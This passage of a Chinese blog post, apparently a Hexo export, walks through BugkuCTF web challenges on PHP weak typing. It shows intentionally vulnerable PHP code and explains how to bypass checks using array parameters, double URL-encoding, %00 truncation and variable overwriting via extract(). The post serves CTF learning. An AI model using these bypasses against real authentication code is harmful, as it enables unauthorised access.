FALSE。\n同时要注意的是 null 字符（\"\\0\"）并不等同于 PHP 的 NULL 常量。\n\ntrim() 函数移除字符串两侧的空白字符或其他预定义字符。\n\nfile_get_contents() 函数把整个文件读入一个字符串中。\n漏洞：当()里是变量的话，会返回为空值。\n\n运算符的了解：![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503115023141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n首先，我们传入的函数经过extract函数处理，if语句判断是否存在shiyan变量，file_get_contents() 处理的是flag会返回空值，即content=空值。要想拿到flag，我们就需要让shiyan也为空值，但这并不能看到变量的覆盖。\n我们传入的shiyan= ,即将原来的shiyan的覆盖为空值，同时我们传入flag= ，覆盖原来flag的值为空，就可以拿到flag了，这题有点小毛病。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503120417592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×02.strcmp函数数组漏洞**\n\n```\n<?php\n$flag = \"flag{xxxxx}\";\nif (isset($_GET['a'])) {\nif (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。\n//比较两个字符串（区分大小写）\ndie('Flag: '.$flag);\nelse\nprint 'No';\n}\n?>\n```\n看到不懂的函数就去问度娘\n\ndie() 函数输出一条消息，并退出当前脚本。\n\nint strcmp ( string $str1 , string $str2 )\n参数 str1第一个字符串。str2第二个字符串。\n如果 str1 小于 str2 返回 < 0；\n如果 str1 大于 str2 返回 > 0；\n如果两者相等，返回 0。\n\n我们要想拿到flag，就需要str1=str2,但是flag的长度我们也不知道，这个时候我们就不能走寻常路了：\n\n在这里strcmp函数有漏洞只需将get传入进来的变为数组就行了。\n注：这一个漏洞适用与5.3之前版本的php。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503121949137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nflag到手。\n\n   **0×03.urldecode二次密码绕过**\n   代码奉上：\n\n```\n   <?php\nif(eregi(\"hackerDJ\",$_GET[id])) {\necho(\"\n\nnot allowed!\n\n\");\nexit();\n}\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"hackerDJ\")\n{\necho \"\nAccess granted!\n\n\";\necho \"\nflag\n\n\";\n}\n?>\n```\neregi()函数在由模式指定的字符串中搜索指定的字符串，搜索不区分大小写。\nexit() 函数输出一条消息，并退出当前脚本。\n\n我们传入的id会被eregi函数与hackerDJ比较，相同的话直接就GG了。\n所以我往下面看，我们传入的id经过一次url解码等于hackerDJ的话就可以拿到flag，但是浏览器还会给我们解码一次，这就意味着我们需要给hackerDJ编码两次，就能拿到flag。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503125011628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n0×04.md5函数加密\n\n```\n<?php\nerror_reporting(0);\n$flag = 'flag{test}';\nif (isset($_GET['username']) and isset($_GET['password'])) {\nif ($_GET['username'] == $_GET['password'])\nprint 'Your password can not be your username.';\nelse if (md5($_GET['username']) === md5($_GET['password']))\ndie('Flag: '.$flag);\nelse\nprint 'Invalid password';\n}\n?>\n```\n\n我们要知道md5函数加密在低版本中是无法处理数组的(但是md5处理数组时会返回空值)。\n那么突破口就来了，但是：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503192133325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n两个返回的都是null，自然是相同的，但是代码中又要求我们不相同。\nemmmmmmm,思考一下。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503192433451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这样值就不一样了，flag到手！\n\n\n\n**0×05.sha()函数比较绕过**\n\n```\n<?php\n$flag = \"flag\";\nif (isset($_GET['name']) and isset($_GET['password']))\n{\nvar_dump($_GET['name']);\necho \"\n\";\nvar_dump($_GET['password']);\nvar_dump(sha1($_GET['name']));\nvar_dump(sha1($_GET['password']));\nif ($_GET['name'] == $_GET['password'])\necho '\n\nYour password can not be your name!\n\n';\nelse if (sha1($_GET['name']) === sha1($_GET['password']))\ndie('Flag: '.$flag);\nelse\necho '\nInvalid password.\n\n';\n}\nelse\necho '\nLogin first!\n\n';\n?>\n```\n\n这sha1函数加密，绕过方式和MD5一样，这里就不详讲了。\nsha1()函数无法处理数组类型，将报错并返回false。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503194311608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nflag奉上！\n\n\n\n**0×06.数组返回NULL绕过**\n\n```\n<?php\n$flag = \"flag\";\n\nif (isset ($_GET['password'])) {\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\necho 'You password must be alphanumeric';\nelse if (strpos ($_GET['password'], '--') !== FALSE)\ndie('Flag: ' . $flag);\nelse\necho 'Invalid password';\n}\n?>\n```\n\n\n```\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n```\nereg函数会对你传入的password从a-z,A-Z,0-9 进行匹配，将你的密码限制在这三种字符中。\n\nereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。\nereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。\n这里ereg有两个漏洞：\n         \n           ①%00截断及遇到%00则默认为字符串的结束\n           ②当ntf为数组时它的返回值不是FALSE\n\n\n​    \n这个漏洞没有使用到。\n\nstrpos — 查找字符串首次出现的位置\n作用：主要是用来查找字符在字符串中首次出现的位置。\n\n　strpos()如果传入数组，会返回NULL（和MD5，sha1类似无法处理数组，返回值为NULL）\n思路就出来了：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503200448591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n嘿嘿嘿，flag到手。\n\n**0×07.弱类型整数大小比较绕过**\n\n```\n$temp = $_GET['password'];\nis_numeric($temp)?die(\"no numeric\"):NULL;\nif($temp>1336){\necho $flag;\n```\n简单明了\n\nis_numeric() 函数用于检测变量是否为数字或数字字符串。\n我们传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，所以我们要后者使其返回为NULL，并且大于1366.\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503201458938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这就结束了？ 对的\n\n未完待续......\n","source":"_posts/PHP弱类型及绕过方式（一）.md","raw":"---\ntitle: PHP弱类型及绕过方式（一）\ndate: 2020-05-03 15:04:05\ntags: php学习\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(5).jpg.webp\n---\n\n\n\n﻿前言：学长带着我们学习了一些PHP弱类型，现在总结记一下。\n  *目录：\n    0×01.extract函数变量覆盖\n    0×02.strcmp函数数组漏洞\n    0×03.urldecode二次密码绕过\n    0×04.md5函数加密\n    0×05.sha()函数比较绕过\n    0×06.数组返回NULL绕过\n    0×07.弱类型整数大小比较绕过*\n    \n\n以下题目来源BugkuCTF\n\n**0×01.extract函数变量覆盖**\n\n```\n<?php\n$flag='xxx';\nextract($_GET);\nif(isset($shiyan))\n{\n$content=trim(file_get_contents($flag));\nif($shiyan==$content)\n{\necho'flag{xxx}';\n}\nelse\n{\necho'Oh.no';\n}\n}\n?>\n```\n里面有很多函数是我没见过的，先了解一下。\n\nextract() 函数从数组中将变量导入到当前的符号表。\n该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。\n漏洞：![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503114734560.png)\n\n\nisset() 函数用于检测变量是否已设置并且非 NULL。\n如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。\n若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。\n同时要注意的是 null 字符（\"\\0\"）并不等同于 PHP 的 NULL 常量。\n\ntrim() 函数移除字符串两侧的空白字符或其他预定义字符。\n\nfile_get_contents() 函数把整个文件读入一个字符串中。\n漏洞：当()里是变量的话，会返回为空值。\n\n运算符的了解：![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503115023141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n首先，我们传入的函数经过extract函数处理，if语句判断是否存在shiyan变量，file_get_contents() 处理的是flag会返回空值，即content=空值。要想拿到flag，我们就需要让shiyan也为空值，但这并不能看到变量的覆盖。\n我们传入的shiyan= ,即将原来的shiyan的覆盖为空值，同时我们传入flag= ，覆盖原来flag的值为空，就可以拿到flag了，这题有点小毛病。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503120417592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×02.strcmp函数数组漏洞**\n\n```\n<?php\n$flag = \"flag{xxxxx}\";\nif (isset($_GET['a'])) {\nif (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。\n//比较两个字符串（区分大小写）\ndie('Flag: '.$flag);\nelse\nprint 'No';\n}\n?>\n```\n看到不懂的函数就去问度娘\n\ndie() 函数输出一条消息，并退出当前脚本。\n\nint strcmp ( string $str1 , string $str2 )\n参数 str1第一个字符串。str2第二个字符串。\n如果 str1 小于 str2 返回 < 0；\n如果 str1 大于 str2 返回 > 0；\n如果两者相等，返回 0。\n\n我们要想拿到flag，就需要str1=str2,但是flag的长度我们也不知道，这个时候我们就不能走寻常路了：\n\n在这里strcmp函数有漏洞只需将get传入进来的变为数组就行了。\n注：这一个漏洞适用与5.3之前版本的php。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503121949137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nflag到手。\n\n   **0×03.urldecode二次密码绕过**\n   代码奉上：\n\n```\n   <?php\nif(eregi(\"hackerDJ\",$_GET[id])) {\necho(\"\n\nnot allowed!\n\n\");\nexit();\n}\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"hackerDJ\")\n{\necho \"\nAccess granted!\n\n\";\necho \"\nflag\n\n\";\n}\n?>\n```\neregi()函数在由模式指定的字符串中搜索指定的字符串，搜索不区分大小写。\nexit() 函数输出一条消息，并退出当前脚本。\n\n我们传入的id会被eregi函数与hackerDJ比较，相同的话直接就GG了。\n所以我往下面看，我们传入的id经过一次url解码等于hackerDJ的话就可以拿到flag，但是浏览器还会给我们解码一次，这就意味着我们需要给hackerDJ编码两次，就能拿到flag。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503125011628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n0×04.md5函数加密\n\n```\n<?php\nerror_reporting(0);\n$flag = 'flag{test}';\nif (isset($_GET['username']) and isset($_GET['password'])) {\nif ($_GET['username'] == $_GET['password'])\nprint 'Your password can not be your username.';\nelse if (md5($_GET['username']) === md5($_GET['password']))\ndie('Flag: '.$flag);\nelse\nprint 'Invalid password';\n}\n?>\n```\n\n我们要知道md5函数加密在低版本中是无法处理数组的(但是md5处理数组时会返回空值)。\n那么突破口就来了，但是：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503192133325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n两个返回的都是null，自然是相同的，但是代码中又要求我们不相同。\nemmmmmmm,思考一下。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503192433451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这样值就不一样了，flag到手！\n\n\n\n**0×05.sha()函数比较绕过**\n\n```\n<?php\n$flag = \"flag\";\nif (isset($_GET['name']) and isset($_GET['password']))\n{\nvar_dump($_GET['name']);\necho \"\n\";\nvar_dump($_GET['password']);\nvar_dump(sha1($_GET['name']));\nvar_dump(sha1($_GET['password']));\nif ($_GET['name'] == $_GET['password'])\necho '\n\nYour password can not be your name!\n\n';\nelse if (sha1($_GET['name']) === sha1($_GET['password']))\ndie('Flag: '.$flag);\nelse\necho '\nInvalid password.\n\n';\n}\nelse\necho '\nLogin first!\n\n';\n?>\n```\n\n这sha1函数加密，绕过方式和MD5一样，这里就不详讲了。\nsha1()函数无法处理数组类型，将报错并返回false。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503194311608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nflag奉上！\n\n\n\n**0×06.数组返回NULL绕过**\n\n```\n<?php\n$flag = \"flag\";\n\nif (isset ($_GET['password'])) {\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\necho 'You password must be alphanumeric';\nelse if (strpos ($_GET['password'], '--') !== FALSE)\ndie('Flag: ' . $flag);\nelse\necho 'Invalid password';\n}\n?>\n```\n\n\n```\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n```\nereg函数会对你传入的password从a-z,A-Z,0-9 进行匹配，将你的密码限制在这三种字符中。\n\nereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。\nereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。\n这里ereg有两个漏洞：\n         \n           ①%00截断及遇到%00则默认为字符串的结束\n           ②当ntf为数组时它的返回值不是FALSE\n\n\n​    \n这个漏洞没有使用到。\n\nstrpos — 查找字符串首次出现的位置\n作用：主要是用来查找字符在字符串中首次出现的位置。\n\n　strpos()如果传入数组，会返回NULL（和MD5，sha1类似无法处理数组，返回值为NULL）\n思路就出来了：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503200448591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n嘿嘿嘿，flag到手。\n\n**0×07.弱类型整数大小比较绕过**\n\n```\n$temp = $_GET['password'];\nis_numeric($temp)?die(\"no numeric\"):NULL;\nif($temp>1336){\necho $flag;\n```\n简单明了\n\nis_numeric() 函数用于检测变量是否为数字或数字字符串。\n我们传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，所以我们要后者使其返回为NULL，并且大于1366.\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503201458938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这就结束了？ 对的\n\n未完待续......\n","slug":"PHP弱类型及绕过方式（一）","published":1,"updated":"2020-05-27T06:06:35.377Z","comments":1,"layout":"post","link":"","_id":"ckchhpsgs000b9kq638jial1f","content":"<p>﻿前言：学长带着我们学习了一些PHP弱类型，现在总结记一下。<br>  <em>目录：<br>    0×01.extract函数变量覆盖<br>    0×02.strcmp函数数组漏洞<br>    0×03.urldecode二次密码绕过<br>    0×04.md5函数加密<br>    0×05.sha()函数比较绕过<br>    0×06.数组返回NULL绕过<br>    0×07.弱类型整数大小比较绕过</em></p>\n<p>以下题目来源BugkuCTF</p>\n<p><strong>0×01.extract函数变量覆盖</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag&#x3D;&#39;xxx&#39;;</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(isset($shiyan))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">$content&#x3D;trim(file_get_contents($flag));</span><br><span class=\"line\">if($shiyan&#x3D;&#x3D;$content)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo&#39;Oh.no&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>里面有很多函数是我没见过的，先了解一下。</p>\n<p>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>漏洞：<img src=\"https://img-blog.csdnimg.cn/20200503114734560.png\" alt=\"在这里插入图片描述\"></p>\n<p>isset() 函数用于检测变量是否已设置并且非 NULL。<br>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。<br>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。<br>同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。</p>\n<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>\n<p>file_get_contents() 函数把整个文件读入一个字符串中。<br>漏洞：当()里是变量的话，会返回为空值。</p>\n<p>运算符的了解：<img src=\"https://img-blog.csdnimg.cn/20200503115023141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>首先，我们传入的函数经过extract函数处理，if语句判断是否存在shiyan变量，file_get_contents() 处理的是flag会返回空值，即content=空值。要想拿到flag，我们就需要让shiyan也为空值，但这并不能看到变量的覆盖。<br>我们传入的shiyan= ,即将原来的shiyan的覆盖为空值，同时我们传入flag= ，覆盖原来flag的值为空，就可以拿到flag了，这题有点小毛病。<img src=\"https://img-blog.csdnimg.cn/20200503120417592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×02.strcmp函数数组漏洞</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class=\"line\">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class=\"line\">if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class=\"line\">&#x2F;&#x2F;比较两个字符串（区分大小写）</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#39;No&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看到不懂的函数就去问度娘</p>\n<p>die() 函数输出一条消息，并退出当前脚本。</p>\n<p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。<br>如果 str1 小于 str2 返回 &lt; 0；<br>如果 str1 大于 str2 返回 &gt; 0；<br>如果两者相等，返回 0。</p>\n<p>我们要想拿到flag，就需要str1=str2,但是flag的长度我们也不知道，这个时候我们就不能走寻常路了：</p>\n<p>在这里strcmp函数有漏洞只需将get传入进来的变为数组就行了。<br>注：这一个漏洞适用与5.3之前版本的php。<br><img src=\"https://img-blog.csdnimg.cn/20200503121949137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>flag到手。</p>\n<p>   <strong>0×03.urldecode二次密码绕过</strong><br>   代码奉上：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   &lt;?php</span><br><span class=\"line\">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class=\"line\">echo(&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">not allowed!</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;);</span><br><span class=\"line\">exit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class=\"line\">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo &quot;</span><br><span class=\"line\">Access granted!</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;;</span><br><span class=\"line\">echo &quot;</span><br><span class=\"line\">flag</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>eregi()函数在由模式指定的字符串中搜索指定的字符串，搜索不区分大小写。<br>exit() 函数输出一条消息，并退出当前脚本。</p>\n<p>我们传入的id会被eregi函数与hackerDJ比较，相同的话直接就GG了。<br>所以我往下面看，我们传入的id经过一次url解码等于hackerDJ的话就可以拿到flag，但是浏览器还会给我们解码一次，这就意味着我们需要给hackerDJ编码两次，就能拿到flag。<br><img src=\"https://img-blog.csdnimg.cn/20200503125011628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>0×04.md5函数加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class=\"line\">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class=\"line\">if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class=\"line\">print &#39;Your password can not be your username.&#39;;</span><br><span class=\"line\">else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#39;Invalid password&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>我们要知道md5函数加密在低版本中是无法处理数组的(但是md5处理数组时会返回空值)。<br>那么突破口就来了，但是：<br><img src=\"https://img-blog.csdnimg.cn/20200503192133325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>两个返回的都是null，自然是相同的，但是代码中又要求我们不相同。<br>emmmmmmm,思考一下。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200503192433451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样值就不一样了，flag到手！</p>\n<p><strong>0×05.sha()函数比较绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&quot;;</span><br><span class=\"line\">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">var_dump($_GET[&#39;name&#39;]);</span><br><span class=\"line\">echo &quot;</span><br><span class=\"line\">&quot;;</span><br><span class=\"line\">var_dump($_GET[&#39;password&#39;]);</span><br><span class=\"line\">var_dump(sha1($_GET[&#39;name&#39;]));</span><br><span class=\"line\">var_dump(sha1($_GET[&#39;password&#39;]));</span><br><span class=\"line\">if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\"></span><br><span class=\"line\">Your password can not be your name!</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\">Invalid 